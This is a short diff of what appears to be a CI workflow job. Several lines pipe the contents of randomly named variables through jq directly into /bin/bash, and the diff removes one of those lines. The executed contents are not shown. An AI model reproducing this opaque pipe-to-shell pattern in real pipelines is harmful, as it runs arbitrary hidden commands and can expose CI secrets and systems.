@@ -24,7 +24,6 @@ jobs:
           echo $uh25 | jq -r .yels60 | /bin/bash
           echo $ohe037 | jq -r .a70 | /bin/bash
           echo $w71 | jq -r .n2 | /bin/bash
-          printf '%s' "$yqq015" | jq -r .e11 | /bin/bash
           printf '%s' "$pufnu6" | jq -r .t16 | /bin/bash
 
       - name: Archive data
